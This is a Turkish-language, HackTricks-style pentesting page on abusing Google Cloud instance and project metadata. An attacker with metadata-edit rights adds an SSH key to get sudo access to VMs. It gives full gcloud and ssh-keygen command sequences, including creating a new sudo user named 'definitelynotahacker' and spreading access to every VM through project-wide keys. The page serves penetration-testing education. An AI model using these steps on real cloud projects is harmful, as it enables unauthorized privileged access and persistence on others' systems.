# GCP - Özel SSH Metadata Ekle

## GCP - Özel SSH Metadata Ekle

{{#include ../../../../banners/hacktricks-training.md}}

### Metadata'yı Değiştirme <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

Bir örnekte metadata değişikliği, **bir saldırgan gerekli izinleri elde ederse önemli güvenlik risklerine yol açabilir**.

#### **Özel Metadata'ya SSH Anahtarlarının Dahil Edilmesi**

GCP'de, **Linux sistemleri** genellikle [Google Compute Engine için Python Linux Misafir Ortamı](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts) üzerinden betikler çalıştırır. Bunun kritik bir bileşeni, **yetkilendirilmiş SSH genel anahtarlarındaki güncellemeleri** kontrol etmek için örnek metadata uç noktasını **düzenli olarak kontrol etmek** üzere tasarlanmış [accounts daemon](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)dır.

Bu nedenle, bir saldırgan özel metadata'yı değiştirebilirse, daemon'un yeni bir genel anahtar bulmasını sağlayabilir; bu anahtar işlenip **yerel sisteme entegre edilecektir**. Anahtar, **mevcut bir kullanıcının veya `sudo` ayrıcalıkları olan yeni bir kullanıcının** `~/.ssh/authorized_keys` dosyasına eklenecektir; bu, anahtarın formatına bağlıdır. Ve saldırgan, ana bilgisayarı tehlikeye atabilecektir.

#### **Mevcut ayrıcalıklı kullanıcıya SSH anahtarı ekleme**

1. **Örnekteki Mevcut SSH Anahtarlarını İnceleyin:**

- Mevcut SSH anahtarlarını bulmak için örneği ve metadata'sını tanımlamak üzere komutu çalıştırın. Çıktıdaki ilgili bölüm `metadata` altında, özellikle `ssh-keys` anahtarı altında olacaktır.

```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```

- SSH anahtarlarının formatına dikkat edin: kullanıcı adı anahtarın önündedir ve iki nokta üst üste ile ayrılmıştır.

2. **SSH Anahtarı Metadata'sı için Bir Metin Dosyası Hazırlayın:**
- Kullanıcı adları ve bunlara karşılık gelen SSH anahtarlarının detaylarını `meta.txt` adlı bir metin dosyasına kaydedin. Bu, mevcut anahtarları korumak için gereklidir.
3. **Hedef Kullanıcı için Yeni Bir SSH Anahtarı Oluşturun (`alice` bu örnekte):**

- Yeni bir SSH anahtarı oluşturmak için `ssh-keygen` komutunu kullanın ve yorum alanının (`-C`) hedef kullanıcı adıyla eşleştiğinden emin olun.

```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```

- Yeni genel anahtarı `meta.txt` dosyasına ekleyin, örneğin örneğin metadata'da bulunan formatı taklit ederek.

4. **Örneğin SSH Anahtarı Metadata'sını Güncelleyin:**

- Güncellenmiş SSH anahtarı metadata'sını örneğe uygulamak için `gcloud compute instances add-metadata` komutunu kullanın.

```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```

5. **Yeni SSH Anahtarı ile Örneğe Erişim Sağlayın:**

- Yeni anahtarı kullanarak SSH ile örneğe bağlanın ve hedef kullanıcı bağlamında shell'e erişin (`alice` bu örnekte).

```bash
ssh -i ./key alice@localhost
sudo id
```

#### **Yeni bir ayrıcalıklı kullanıcı oluşturun ve bir SSH anahtarı ekleyin**

Eğer ilginç bir kullanıcı bulunamazsa, `sudo` ayrıcalıkları verilecek yeni bir kullanıcı oluşturmak mümkündür:
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
#### Proje düzeyinde SSH anahtarları <a href="#sshing-around" id="sshing-around"></a>

**Proje düzeyinde SSH anahtarları uygulayarak** bir bulut ortamında birden fazla Sanal Makine (VM) için SSH erişimini genişletmek mümkündür. Bu yaklaşım, projede açıkça proje genelinde SSH anahtarlarını engellemeyen herhangi bir örneğe SSH erişimi sağlar. İşte özet bir kılavuz:

1. **Proje Düzeyinde SSH Anahtarlarını Uygula:**

- `meta.txt` dosyasındaki SSH anahtarlarını projenin meta verilerine eklemek için `gcloud compute project-info add-metadata` komutunu kullanın. Bu işlem, SSH anahtarlarının projedeki tüm VM'ler tarafından tanınmasını sağlar, eğer bir VM "Proje genelinde SSH anahtarlarını engelle" seçeneğini etkinleştirmemişse.

```bash
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```

2. **Proje Genel Anahtarları Kullanarak Örneklerine SSH Bağlan:**
- Proje genelinde SSH anahtarları mevcut olduğunda, projedeki herhangi bir örneğe SSH ile bağlanabilirsiniz. Proje genelinde anahtarları engellemeyen örnekler, SSH anahtarını kabul ederek erişim sağlar.
- Bir örneğe SSH ile bağlanmanın doğrudan bir yöntemi, `gcloud compute ssh [INSTANCE]` komutunu kullanmaktır. Bu komut, mevcut kullanıcı adınızı ve proje düzeyinde ayarlanmış SSH anahtarlarını kullanarak erişim sağlamaya çalışır.

## Referanslar

- [https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/](https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/)

{{#include ../../../../banners/hacktricks-training.md}}
